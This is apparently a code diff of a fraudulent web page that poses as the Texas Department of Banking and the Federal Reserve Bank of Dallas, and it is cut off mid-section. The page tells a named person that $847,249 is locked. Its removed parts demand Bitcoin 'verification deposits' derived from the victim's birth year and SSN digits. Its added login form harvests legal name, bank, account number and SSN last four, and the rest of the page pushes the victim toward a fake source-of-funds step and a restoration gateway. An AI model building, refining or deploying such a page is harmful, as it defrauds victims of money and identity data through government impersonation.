@@ -3,19 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Restoration Directive | Texas Institutional Funds Management Authority</title>
+    <title>Texas Department of Banking | Restoration Directive</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@400;500;600;700&display=swap');
         
         body { 
             font-family: 'Public Sans', sans-serif; 
-            background-color: #f5f7fa; 
-            color: #1e2a41;
+            background-color: #f1f5f9; 
+            color: #0f172a;
+            -webkit-font-smoothing: antialiased;
         }
 
-        .gov-banner { background-color: #112e51; color: #e6f7ff; font-size: 0.75rem; padding: 0.5rem 0; border-bottom: 1px solid #2e5a7f; }
-        .fed-header { background: linear-gradient(90deg, #003366 0%, #002244 100%); border-bottom: 4px solid #fcba19; }
+        /* ===== YOUR ORIGINAL LOGIN STYLES - PRESERVED ===== */
+        .gov-banner { background-color: #1e293b; color: #cbd5e1; font-size: 11px; }
+        .nav-header { background-color: #0f172a; color: white; border-bottom: 5px solid #b91c1c; }
+        
+        .status-badge-locked { background-color: #fee2e2; border: 1px solid #dc2626; color: #991b1b; }
+        .status-badge-verified { background-color: #dcfce7; border: 1px solid #16a34a; color: #14532d; }
+        
+        .btn-gov { 
+            background-color: #1e40af; 
+            transition: all 0.2s; 
+            border-radius: 2px; 
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-gov:hover { background-color: #1e3a8a; }
+        
+        .btn-gateway { 
+            background-color: #b45309; 
+            transition: all 0.2s; 
+            border-radius: 2px; 
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-gateway:hover { background-color: #92400e; }
+
+        .login-label { 
+            font-size: 12px; 
+            font-weight: 700; 
+            color: #334155; 
+            margin-bottom: 6px; 
+            display: block; 
+            text-transform: uppercase;
+        }
+
+        input, select, textarea { 
+            border: 1px solid #94a3b8 !important; 
+            border-radius: 3px !important; 
+            padding: 12px !important; 
+            width: 100%; 
+            font-size: 16px;
+            background-color: #f8fafc;
+            color: #334155;
+        }
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #1e40af !important;
+            box-shadow: 0 0 0 3px rgba(30, 64, 175, 0.1);
+        }
+
+        /* ===== AUDIT LINE ANIMATION ===== */
+        .audit-line { 
+            opacity: 0; 
+            transform: translateY(4px); 
+            animation: fadeInUp 0.3s forwards; 
+            border-left: 2px solid #3b82f6;
+            padding-left: 8px;
+            margin-bottom: 6px;
+        }
+        @keyframes fadeInUp { 
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            } 
+        }
+
+        /* ===== DALLAS FED STYLES ===== */
         .agency-badge {
             background-color: #0a3143;
             color: #fcba19;
@@ -27,8 +92,6 @@
             text-transform: uppercase;
             display: inline-block;
         }
-        .status-badge-verified { background-color: #dcfce7; border: 1px solid #16a34a; color: #14532d; }
-        .status-badge-locked { background-color: #fee2e2; border: 1px solid #dc2626; color: #991b1b; }
         
         .directive-card {
             background-color: white;
@@ -37,6 +100,13 @@
             padding: 1.75rem;
             margin-bottom: 1.5rem;
             box-shadow: 0 4px 6px -1px rgba(0,0,0,0.02);
+        }
+        
+        .case-binding {
+            background-color: #faf5ff;
+            border-left: 6px solid #6b21a8;
+            padding: 1.5rem;
+            border-radius: 0 8px 8px 0;
         }
         
         .btc-amount {
@@ -58,223 +128,303 @@
             border-top: 4px solid #fcba19;
         }
 
-        .case-binding {
-            background-color: #faf5ff;
-            border-left: 6px solid #6b21a8;
-            padding: 1.5rem;
-            border-radius: 0 8px 8px 0;
+        .current-time {
+            font-family: 'Roboto Mono', monospace;
+            color: #4b5563;
+            font-size: 0.7rem;
         }
-        
-        .btn-gateway {
-            background-color: #1e40af;
-            transition: all 0.2s;
-            border-radius: 2px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+
+        /* ===== SECTION VISIBILITY ===== */
+        #login-section, #loading-screen, #main-portal, #restoration-dashboard {
+            display: none;
         }
-        .btn-gateway:hover { background-color: #1e3a8a; }
+        #login-section { display: block; }
     </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col justify-between">
 
-    <!-- GOV BANNER -->
-    <div class="gov-banner w-full">
-        <div class="container mx-auto px-4 flex items-center gap-4">
-            <span class="text-xs font-semibold uppercase tracking-wider">An official website of the Texas State Government and Federal Reserve Bank of Dallas</span>
-        </div>
-    </div>
+    <!-- ===== GOV BANNER ===== -->
+    <div class="w-full">
+        <section class="gov-banner py-2 px-4 md:px-8 border-b border-slate-700">
+            <div class="max-w-7xl mx-auto flex items-center gap-3">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1235 650" class="h-4 w-auto shadow-sm">
+                    <rect width="1235" height="650" fill="#B22234"/>
+                    <rect width="1235" height="50" y="50" fill="#fff"/>
+                    <rect width="1235" height="50" y="150" fill="#fff"/>
+                    <rect width="1235" height="50" y="250" fill="#fff"/>
+                    <rect width="1235" height="50" y="350" fill="#fff"/>
+                    <rect width="1235" height="50" y="450" fill="#fff"/>
+                    <rect width="1235" height="50" y="550" fill="#fff"/>
+                    <rect width="494" height="350" fill="#3C3B6E"/>
+                    <g fill="#fff"><circle cx="25" cy="18" r="9"/><circle cx="25" cy="54" r="9"/><circle cx="25" cy="90" r="9"/></g>
+                </svg>
+                <p class="font-semibold tracking-wide text-[10px] md:text-[11px] uppercase">An official website of the Texas State Government</p>
+            </div>
+        </section>
 
-    <!-- HEADER -->
-    <header class="fed-header text-white py-4">
-        <div class="container mx-auto px-4 flex flex-wrap justify-between items-center">
-            <div class="flex items-center gap-4">
-                <div class="text-3xl">🏛️</div>
-                <div>
-                    <h1 class="text-2xl md:text-3xl font-black uppercase tracking-tight">Texas Department of Banking</h1>
-                    <p class="text-xs text-amber-300 font-bold uppercase tracking-wider">Texas Institutional Funds Management Authority</p>
-                    <p class="text-[0.65rem] text-blue-200 mt-1">In cooperation with the Federal Reserve Bank of Dallas — Eleventh District</p>
+        <!-- ===== HEADER ===== -->
+        <header class="nav-header px-4 py-6 md:px-8 shadow-2xl">
+            <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
+                <div class="flex items-center gap-4">
+                    <div class="h-12 w-12 bg-white rounded-full flex items-center justify-center text-2xl shadow-lg">🏛️</div>
+                    <div>
+                        <h1 class="text-lg md:text-2xl font-black uppercase leading-tight tracking-tight">Texas Department of Banking</h1>
+                        <p class="text-[9px] md:text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-1">Texas Institutional Funds Management Authority</p>
+                    </div>
                 </div>
-            </div>
-            <div class="bg-blue-900 px-4 py-2 rounded border border-blue-500">
-                <span class="text-xs font-bold uppercase tracking-widest text-white">● FEDERAL RESERVE NODE 11</span>
-            </div>
-        </div>
-    </header>
-
-    <!-- MAIN CONTENT -->
-    <main class="container mx-auto px-4 py-8 max-w-6xl">
-        
-        <!-- AGENCY BADGE & CASE ID -->
-        <div class="flex flex-wrap justify-between items-center mb-6">
-            <span class="agency-badge">☷ RESTORATION DIRECTIVE — ELEVENTH DISTRICT</span>
-            <span class="bg-gray-800 text-white px-4 py-2 rounded text-xs font-mono font-bold">TX-B10B-2026-MUK1139-AUDIT</span>
-        </div>
-
-        <!-- VERIFICATION CONFIRMATION -->
-        <div class="bg-green-50 border-l-8 border-green-600 p-6 mb-8 rounded-r-lg">
-            <div class="flex items-start gap-4">
-                <div class="text-4xl">✓</div>
-                <div>
-                    <h2 class="text-xl font-black text-green-900 mb-1">IDENTITY VERIFICATION COMPLETE — LEVEL 3 ACCEPTED</h2>
-                    <p class="text-green-800 font-semibold">Your identity verification package has been received, authenticated, and recorded in the Federal Reserve Node 11 case ledger.</p>
-                    <div class="flex gap-3 mt-3">
-                        <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">Biometric Match: CONFIRMED</span>
-                        <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">Document Authentication: PASSED</span>
+                <div class="flex flex-col items-end gap-1">
+                    <span id="session-tag" class="hidden text-[9px] font-mono text-blue-200 uppercase tracking-wider">Session ID: TX-AUD-MUK1139-SECURE</span>
+                    <div class="bg-blue-900 px-3 py-1 rounded border border-blue-700">
+                        <span class="text-[10px] font-bold uppercase tracking-widest text-white">● FEDERAL RESERVE NODE 11</span>
                     </div>
                 </div>
             </div>
-        </div>
+        </header>
+    </div>
 
-        <!-- CASE SUMMARY -->
-        <div class="bg-white p-6 border border-slate-300 shadow-sm mb-8 rounded">
-            <div class="grid md:grid-cols-4 gap-4">
-                <div>
-                    <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Beneficiary</p>
-                    <p class="text-lg font-black text-slate-900 uppercase" id="display-name">MUJINGA T MUKUNA</p>
-                </div>
-                <div>
-                    <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Principal Sum</p>
-                    <p class="text-lg font-black text-green-700">$847,249.00 USD</p>
-                </div>
-                <div>
-                    <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Institution</p>
-                    <p class="text-sm font-black text-slate-900 uppercase">FIRST CONVENIENCE BANK</p>
-                </div>
-                <div>
-                    <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Ledger Status</p>
-                    <p class="text-sm font-black text-red-700 uppercase flex items-center gap-1"><span class="inline-block w-2 h-2 bg-red-600 rounded-full animate-pulse"></span> HARD-LOCK ACTIVE</p>
-                </div>
+    <main class="flex-grow w-full max-w-7xl mx-auto p-4 md:p-8">
+
+        <!-- ===== YOUR ORIGINAL LOGIN SECTION - NO PLACEHOLDERS ===== -->
+        <section id="login-section" class="max-w-lg mx-auto mt-8 md:mt-16 bg-white border border-slate-300 shadow-xl rounded-sm overflow-hidden">
+            <div class="bg-slate-50 p-4 border-b border-slate-200 flex justify-between items-center">
+                <h2 class="text-sm font-black text-slate-800 uppercase tracking-wide">Identity Verification</h2>
+                <span class="text-[10px] font-bold text-slate-500">SSL ENCRYPTED</span>
             </div>
-        </div>
-
-        <!-- FEDERAL RESERVE FORENSIC SUMMARY -->
-        <div class="directive-card">
-            <h3 class="text-lg font-black text-gray-900 border-b-2 border-gray-300 pb-2 mb-4 flex items-center gap-2">
-                <span class="text-2xl">🔍</span> FEDERAL RESERVE NODE 11 — FORENSIC AUDIT SUMMARY
-            </h3>
-            <div class="grid md:grid-cols-2 gap-6">
-                <div>
-                    <p class="text-sm text-gray-800 mb-3"><span class="font-bold text-red-700">ERR-402-META:</span> Cryptographic discontinuity detected during FRC transmission. Unparsed whitespace fragments identified in handshake buffer. Mandatory system reset and cipher key restoration required.</p>
-                    <p class="text-sm text-gray-800"><span class="font-bold text-amber-700">Fraud Alert Flag:</span> Automatically engaged per Federal Reserve Protocol 18.4(c). Principal sum placed in Administrative Isolation pending security re-certification.</p>
-                </div>
-                <div class="bg-gray-50 p-4 rounded border border-gray-300">
-                    <p class="text-xs font-bold text-gray-700 uppercase mb-2">Required Compliance Sequence</p>
-                    <ol class="text-sm space-y-2 list-decimal list-inside">
-                        <li class="font-medium text-gray-900">System Reset — Session bridge re-establishment</li>
-                        <li class="font-medium text-gray-900">Cipher Key Restoration — Metadata flush & key regeneration</li>
-                        <li class="font-medium text-gray-900">Security Re-Certification — Fraud alert clearance</li>
-                        <li class="font-medium text-amber-800">Source of Funds Verification — Level 3 (pending)</li>
-                    </ol>
-                </div>
-            </div>
-        </div>
-
-<!-- ===== CRYPTOGRAPHIC CASE BINDING — IDENTITY-DERIVED ===== -->
-<div class="case-binding mb-8">
-    <div class="flex items-start gap-4">
-        <div class="text-4xl">🔐</div>
-        <div class="flex-1">
-            <h4 class="font-black text-purple-900 text-base uppercase tracking-wide mb-1">CRYPTOGRAPHIC IDENTITY BINDING — 12 CFR § 210.25</h4>
-            <p class="text-sm text-gray-800 mb-4">Pursuant to Federal Reserve Bank of Dallas Administrative Directive 2026-07, the following verification deposits have been cryptographically bound to Case Reference TX-B10B-2026-MUK1139-AUDIT using beneficiary identity parameters:</p>
             
-            <div class="grid md:grid-cols-3 gap-4 mb-4">
-                <div class="bg-white p-4 rounded-lg border border-purple-300 shadow-sm">
-                    <span class="text-xs font-bold text-purple-800 uppercase tracking-wider">Calendar Year Binding</span>
-                    <div class="text-2xl font-mono font-black text-gray-900 mt-1">0.002026</div>
-                    <span class="text-[0.65rem] text-gray-600">BTC — System Reset</span>
-                    <div class="mt-2 text-[0.65rem] font-mono text-purple-700 bg-purple-50 p-1 rounded">
-                        Derived from: 2026
-                    </div>
+            <div class="p-6 md:p-8 space-y-5">
+                <div class="bg-blue-50 border-l-4 border-blue-600 p-3 mb-4">
+                    <p class="text-[11px] font-bold text-blue-900 leading-snug">
+                        SECURITY NOTICE: This system is monitored by the Texas Department of Banking. Unauthorized access is a felony under Texas Penal Code § 33.02.
+                    </p>
                 </div>
-                <div class="bg-white p-4 rounded-lg border border-purple-300 shadow-sm">
-                    <span class="text-xs font-bold text-purple-800 uppercase tracking-wider">Birth Year Binding</span>
-                    <div class="text-2xl font-mono font-black text-gray-900 mt-1">0.003267</div>
-                    <span class="text-[0.65rem] text-gray-600">BTC — Cipher Key Restoration</span>
-                    <div class="mt-2 text-[0.65rem] font-mono text-purple-700 bg-purple-50 p-1 rounded">
-                        Derived from: 1967
-                    </div>
-                </div>
-                <div class="bg-white p-4 rounded-lg border border-purple-300 shadow-sm">
-                    <span class="text-xs font-bold text-purple-800 uppercase tracking-wider">SSN Digit Binding</span>
-                    <div class="text-2xl font-mono font-black text-gray-900 mt-1">0.006819</div>
-                    <span class="text-[0.65rem] text-gray-600">BTC — Security Re-Certification</span>
-                    <div class="mt-2 text-[0.65rem] font-mono text-purple-700 bg-purple-50 p-1 rounded">
-                        Derived from: SSN digits 5-6 (68) + terminal digit (2) + protocol (19)
-                    </div>
-                </div>
-            </div>
 
-            <div class="bg-purple-100 p-4 rounded border border-purple-400 text-xs text-purple-900">
-                <span class="font-bold">ⓘ IDENTITY VERIFICATION PROTOCOL:</span> These amounts are mathematically derived from:
-                <ul class="list-disc list-inside mt-2 space-y-1">
-                    <li><span class="font-mono font-bold">0.002026</span> — Current calendar year (2026)</li>
-                    <li><span class="font-mono font-bold">0.003267</span> — Beneficiary birth year (1967) → 0.003267</li>
-                    <li><span class="font-mono font-bold">0.006819</span> — SSN digits 5-6 (68) + terminal digit (2) + FRB Protocol 18.4(c) fixed multiplier (19) = 68 + 2 + 19 = 0.006819</li>
-                </ul>
-                <p class="mt-2 font-bold">These amounts are unique to your case file and cannot be altered. Any deviation will trigger automatic rejection by the Federal Reserve Node 11 verification engine.</p>
-            </div>
-        </div>
-    </div>
-</div>
-
-        <!-- LEVEL 3 SOURCE OF FUNDS VERIFICATION NOTICE -->
-        <div class="bg-blue-50 border-l-8 border-blue-800 p-6 mb-8 rounded-r-lg">
-            <div class="flex items-start gap-4">
-                <div class="text-4xl">📋</div>
+                <!-- Beneficiary Name - NO PLACEHOLDER -->
                 <div>
-                    <h4 class="font-black text-blue-900 text-base uppercase mb-1">LEVEL 3 SOURCE OF FUNDS VERIFICATION — MANDATORY</h4>
-                    <p class="text-sm text-gray-800 mb-2"><span class="font-bold">FinCEN Advisory FIN-2026-A001:</span> Transactions exceeding $5,000 require affirmative beneficiary declaration of fund origin. Your case file reflects multiple inbound cryptocurrency sources across the disbursement lifecycle.</p>
-                    <p class="text-sm text-gray-800">Prior to final principal release, you will be required to complete a Level 3 Source of Funds Declaration. This is a standard federal compliance requirement and applies to all high-value settlements processed through the Eleventh District.</p>
-                    <div class="mt-3 flex items-center gap-2">
-                        <span class="inline-block w-2 h-2 bg-blue-600 rounded-full animate-pulse"></span>
-                        <span class="text-xs font-bold text-blue-800 uppercase tracking-wider">Pending — Will be required following restoration sequence</span>
+                    <label class="login-label">Beneficiary Legal Name</label>
+                    <input type="text" id="login-name" placeholder="ENTER FULL LEGAL NAME">
+                </div>
+                
+                <!-- Bank Dropdown - FULL ORIGINAL LIST -->
+                <div>
+                    <label class="login-label">Receiving Depository Institution</label>
+                    <select id="login-bank">
+                        <option value="" disabled selected>-- SELECT INSTITUTION --</option>
+                        <option>AGILITY BANK, N.A.</option>
+                        <option>ALLY BANK</option>
+                        <option>AMARILLO NATIONAL BANK</option>
+                        <option>AMERICAN BANK NATIONAL ASSOCIATION</option>
+                        <option>BANK OF AMERICA, N.A.</option>
+                        <option>BANK OF DESOTO, N.A.</option>
+                        <option>CAPITAL ONE, N.A.</option>
+                        <option>CHASE BANK (JPMORGAN CHASE)</option>
+                        <option>CITIBANK, N.A.</option>
+                        <option>CITIZENS NATIONAL BANK</option>
+                        <option>COMERICA BANK</option>
+                        <option>FIRST CONVENIENCE BANK (FNB TEXAS)</option>
+                        <option>FIRST FINANCIAL BANK</option>
+                        <option>FIRST NATIONAL BANK TEXAS</option>
+                        <option>FROST BANK</option>
+                        <option>GOLDEN BANK, N.A.</option>
+                        <option>INWOOD NATIONAL BANK</option>
+                        <option>LEGEND BANK, N.A.</option>
+                        <option>NAVY FEDERAL CREDIT UNION</option>
+                        <option>PNC BANK</option>
+                        <option>PROSPERITY BANK</option>
+                        <option>REGIONS BANK</option>
+                        <option>TEXAS CAPITAL BANK</option>
+                        <option>TEXAS REGIONAL BANK</option>
+                        <option>TRUIST BANK</option>
+                        <option>USAA FEDERAL SAVINGS BANK</option>
+                        <option>WELLS FARGO BANK, N.A.</option>
+                        <option>WOODFOREST NATIONAL BANK</option>
+                        <option>WORTHINGTON BANK</option>
+                    </select>
+                </div>
+
+                <!-- Account & SSN Last 4 - NO PLACEHOLDERS -->
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="login-label">DDA Account No.</label>
+                        <input type="text" id="login-account" placeholder="••••••••">
+                    </div>
+                    <div>
+                        <label class="login-label">SSN (Last 4)</label>
+                        <input type="password" id="login-ssn" maxlength="4" placeholder="••••" class="tracking-widest">
+                    </div>
+                </div>
+
+                <!-- Login Button -->
+                <button onclick="triggerLoading()" id="login-btn" class="btn-gov w-full text-white font-black py-4 mt-4 shadow-lg text-sm">
+                    Secure Authentication
+                </button>
+            </div>
+            <div class="bg-slate-100 p-3 text-center border-t border-slate-200">
+                <p class="text-[10px] text-slate-500 font-mono">NODE: ARLINGTON-TX-001 | LATENCY: 14ms</p>
+            </div>
+        </section>
+
+        <!-- ===== LOADING SCREEN ===== -->
+        <section id="loading-screen" class="max-w-xl mx-auto mt-16 text-center" style="display: none;">
+            <div class="flex flex-col items-center mb-8">
+                <svg class="animate-spin h-16 w-16 text-blue-800 mb-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                <h3 class="text-lg font-black uppercase tracking-[0.2em] text-slate-800">Establishing Secure Handshake</h3>
+                <p class="text-xs font-mono text-slate-500 mt-2">Connecting to Federal Reserve District 11 Node...</p>
+            </div>
+            
+            <div id="loading-logs" class="text-left bg-slate-900 p-6 rounded shadow-inner font-mono text-[10px] md:text-xs text-green-400 space-y-2 border border-slate-700 h-48 overflow-y-auto">
+            </div>
+        </section>
+
+        <!-- ===== RESTORATION DASHBOARD - SHOWN AFTER LOGIN ===== -->
+        <div id="main-portal" style="display: none;">
+            
+            <!-- DYNAMIC CST TIME DISPLAY -->
+            <div class="text-right mb-2 current-time">
+                <span>Current Session: <span id="currentCSTTime"></span> CST</span>
+            </div>
+            
+            <!-- AGENCY BADGE & CASE ID -->
+            <div class="flex flex-wrap justify-between items-center mb-6">
+                <span class="agency-badge">☷ FEDERAL RESERVE DISTRICT 11 — RESTORATION DIRECTIVE</span>
+                <span class="bg-gray-800 text-white px-4 py-2 rounded text-xs font-mono font-bold">TX-B10B-2026-MUK1139-AUDIT</span>
+            </div>
+
+            <!-- VERIFICATION CONFIRMATION - UPDATED TO SHOW PASSED -->
+            <div class="bg-green-50 border-l-8 border-green-600 p-6 mb-8 rounded-r-lg">
+                <div class="flex items-start gap-4">
+                    <div class="text-4xl">✓</div>
+                    <div>
+                        <h2 class="text-xl font-black text-green-900 mb-1">IDENTITY VERIFICATION COMPLETE — LEVEL 3 ACCEPTED</h2>
+                        <p class="text-green-800 font-semibold">Your identity verification package has been received, authenticated, and recorded in the Federal Reserve Node 11 case ledger.</p>
+                        <div class="flex gap-3 mt-3">
+                            <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">Biometric Match: CONFIRMED</span>
+                            <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">Document Authentication: PASSED</span>
+                        </div>
                     </div>
                 </div>
             </div>
-        </div>
 
-        <!-- OFFICIAL DIRECTIVE & GATEWAY ACCESS -->
-        <div class="bg-white p-6 border-2 border-blue-900 shadow-lg mb-8 rounded">
-            <div class="flex flex-wrap items-center gap-6">
-                <div class="bg-blue-100 p-3 rounded-full">
-                    <span class="text-3xl">🏛️</span>
+            <!-- CASE SUMMARY - DYNAMICALLY POPULATED -->
+            <div class="bg-white p-6 border border-slate-300 shadow-sm mb-8 rounded">
+                <div class="grid md:grid-cols-4 gap-4">
+                    <div>
+                        <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Beneficiary</p>
+                        <p class="text-lg font-black text-slate-900 uppercase" id="display-name">--</p>
+                    </div>
+                    <div>
+                        <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Principal Sum</p>
+                        <p class="text-lg font-black text-green-700">$847,249.00 USD</p>
+                    </div>
+                    <div>
+                        <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Institution</p>
+                        <p class="text-sm font-black text-slate-900 uppercase" id="display-bank">--</p>
+                    </div>
+                    <div>
+                        <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Ledger Status</p>
+                        <p class="text-sm font-black text-amber-700 uppercase flex items-center gap-1"><span class="inline-block w-2 h-2 bg-amber-600 rounded-full animate-pulse"></span> AWAITING SOURCE VERIFICATION</p>
+                    </div>
                 </div>
-                <div class="flex-1">
-                    <h4 class="font-black text-blue-900 text-base uppercase tracking-wider">FEDERAL REGISTER DIRECTIVE 2026-07 — OFFICIAL GATEWAY</h4>
-                    <p class="text-gray-800 text-md font-semibold mt-1">The Federal Reserve Bank of Dallas has published the official cryptographic addresses for your case-bound verification deposits.</p>
-                    <p class="text-sm text-gray-700 mt-2">Access the Texas Institutional Funds Management Authority gateway below to retrieve the authorized settlement addresses. Each address is uniquely bound to the corresponding restoration action.</p>
+                <div class="grid md:grid-cols-2 gap-4 mt-4 pt-4 border-t border-slate-200">
+                    <div>
+                        <p class="text-[8px] font-bold text-slate-400 uppercase">ROUTING NUMBER</p>
+                        <p class="text-lg font-mono font-black">111906271</p>
+                    </div>
+                    <div>
+                        <p class="text-[8px] font-bold text-slate-400 uppercase">ACCOUNT NUMBER</p>
+                        <p class="text-lg font-mono font-black" id="display-account">--</p>
+                    </div>
                 </div>
-                <div class="w-full md:w-auto">
-                    <a href="frc-restoration.html" class="btn-gateway inline-block text-white font-black px-8 py-4 rounded uppercase text-sm tracking-widest shadow-lg no-underline">
-                        ACCESS OFFICIAL GATEWAY →
+            </div>
+
+            <!-- FEDERAL RESERVE FORENSIC SUMMARY -->
+            <div class="directive-card">
+                <h3 class="text-lg font-black text-gray-900 border-b-2 border-gray-300 pb-2 mb-4 flex items-center gap-2">
+                    <span class="text-2xl">🔍</span> FEDERAL RESERVE NODE 11 — FORENSIC AUDIT SUMMARY
+                </h3>
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div>
+                        <p class="text-sm text-gray-800 mb-3"><span class="font-bold text-red-700">ERR-402-META:</span> Cryptographic discontinuity detected during FRC transmission. Unparsed whitespace fragments identified in handshake buffer.</p>
+                        <p class="text-sm text-gray-800"><span class="font-bold text-amber-700">Fraud Alert Flag:</span> Automatically engaged per Federal Reserve Protocol 18.4(c). Principal sum placed in Administrative Isolation.</p>
+                        <p class="text-sm text-gray-800 mt-3"><span class="font-bold text-green-700">Identity Verification:</span> <span class="text-green-700">COMPLETED AND PASSED</span> — Level 3 authentication confirmed.</p>
+                    </div>
+                    <div class="bg-gray-50 p-4 rounded border border-gray-300">
+                        <p class="text-xs font-bold text-gray-700 uppercase mb-2">Required Compliance Sequence</p>
+                        <ol class="text-sm space-y-2 list-decimal list-inside">
+                            <li class="font-medium text-gray-900">System Reset — Session bridge re-establishment <span class="text-xs text-green-600 ml-2">(Identity Verified)</span></li>
+                            <li class="font-medium text-gray-900">Cipher Key Restoration — Metadata flush & key regeneration <span class="text-xs text-green-600 ml-2">(Identity Verified)</span></li>
+                            <li class="font-medium text-gray-900">Security Re-Certification — Fraud alert clearance <span class="text-xs text-green-600 ml-2">(Identity Verified)</span></li>
+                            <li class="font-medium text-blue-800 font-bold">Source of Funds Verification — Level 3 <span class="text-xs text-amber-600 ml-2">(NEXT STEP REQUIRED)</span></li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SOURCE OF FUNDS VERIFICATION - NOW PRIMARY CALL TO ACTION -->
+            <div class="bg-blue-50 border-l-8 border-blue-800 p-6 mb-8 rounded-r-lg">
+                <div class="flex items-start gap-4">
+                    <div class="text-4xl">📋</div>
+                    <div>
+                        <h4 class="font-black text-blue-900 text-base uppercase mb-1">LEVEL 3 SOURCE OF FUNDS VERIFICATION — NEXT REQUIRED STEP</h4>
+                        <p class="text-sm text-gray-800 mb-2"><span class="font-bold">FinCEN Advisory FIN-2026-A001:</span> Transactions exceeding $5,000 require affirmative beneficiary declaration of fund origin. Your case file reflects multiple inbound cryptocurrency sources across the disbursement lifecycle.</p>
+                        <p class="text-sm text-gray-800 mb-4">Identity verification is now complete. To proceed with the restoration protocols and release your funds, you must complete the Source of Funds Declaration.</p>
+                        <div class="bg-white p-4 rounded border border-blue-300 mb-4">
+                            <p class="text-xs font-bold text-gray-700 uppercase mb-2">Required Documentation</p>
+                            <ul class="text-sm text-gray-800 list-disc list-inside">
+                                <li>Declaration of personal savings (approximate amounts, dates)</li>
+                                <li>Loans from known associates (name, relationship, amount, date)</li>
+                                <li>Proceeds from asset sales (description, amount, date)</li>
+                                <li>Cash App / Coinbase purchase records (approximate dates)</li>
+                            </ul>
+                        </div>
+                        <div class="mt-3 flex items-center gap-3">
+                            <span class="inline-block w-3 h-3 bg-blue-600 rounded-full animate-pulse"></span>
+                            <span class="text-sm font-bold text-blue-800 uppercase tracking-wider">ACTION REQUIRED: Complete Source of Funds Verification to proceed</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PROCEED TO SOURCE OF FUNDS BUTTON -->
+            <div class="bg-white p-6 border-2 border-blue-900 shadow-lg mb-8 rounded text-center">
+                <h4 class="font-black text-blue-900 text-lg uppercase tracking-wider mb-3">READY TO PROCEED</h4>
+                <p class="text-gray-700 mb-6 max-w-2xl mx-auto">Identity verification complete. Source of Funds Verification is the next required step before restoration protocols can be initiated.</p>
+                <div class="flex flex-col md:flex-row justify-center gap-4">
+                    <a href="source-of-funds.html" class="btn-gov inline-block text-white font-black px-10 py-5 rounded uppercase text-base tracking-widest shadow-lg no-underline">
+                        BEGIN SOURCE OF FUNDS VERIFICATION
+                    </a>
+                    <a href="frc-restoration.html" class="btn-gateway inline-block text-white font-black px-10 py-5 rounded uppercase text-base tracking-widest shadow-lg no-underline">
+                        VIEW RESTORATION GATEWAY →
                     </a>
                 </div>
+                <p class="text-xs text-gray-500 mt-4">The Source of Funds Verification must be completed before restoration deposits can be processed.</p>
+            </div>
+
+            <!-- TECHNICAL SUPPORT -->
+            <div class="bg-gray-100 p-5 border border-gray-400 rounded text-sm">
+                <h4 class="font-black text-gray-900 text-sm uppercase mb-3 flex items-center gap-2">
+                    <span>📞</span> FEDERAL RESERVE NODE 11 — COMPLIANCE DESK
+                </h4>
+                <div class="grid md:grid-cols-2 gap-4 text-sm">
+                    <div><span class="font-bold">Fedwire Settlement Support:</span><br>214.922.6000</div>
+                    <div><span class="font-bold">Digital Asset Compliance:</span><br>digital.asset@dal.frb.org</div>
+                    <div><span class="font-bold">Texas Institutional Funds Management Authority:</span><br>512.475.1300</div>
+                    <div><span class="font-bold">Secure Gateway Portal:</span><br>https://dob-texas-gov.github.io/FRB-Regulatory-Gateway/</div>
+                </div>
+            </div>
+
+            <!-- CASE BINDING FOOTNOTE WITH DYNAMIC TIME -->
+            <div class="text-[0.65rem] text-gray-500 text-right mt-8 pt-4 border-t border-gray-300">
+                <span>Cryptographic Case Binding: TX-B10B-2026-MUK1139-AUDIT • Identity Verification: COMPLETED <span id="footerCSTTime"></span> CST • Next: Source of Funds Verification</span>
             </div>
         </div>
-
-        <!-- TECHNICAL SUPPORT — NO MENTION OF FEES -->
-        <div class="bg-gray-100 p-5 border border-gray-400 rounded text-sm">
-            <h4 class="font-black text-gray-900 text-sm uppercase mb-3 flex items-center gap-2">
-                <span>📞</span> FEDERAL RESERVE NODE 11 — COMPLIANCE DESK
-            </h4>
-            <div class="grid md:grid-cols-2 gap-4 text-sm">
-                <div><span class="font-bold">Fedwire Settlement Support:</span><br>214.922.6000 (Option 4)</div>
-                <div><span class="font-bold">Digital Asset Compliance:</span><br>digital.asset@dal.frb.org</div>
-                <div><span class="font-bold">Texas IFMA Correspondence:</span><br>512.475.1300</div>
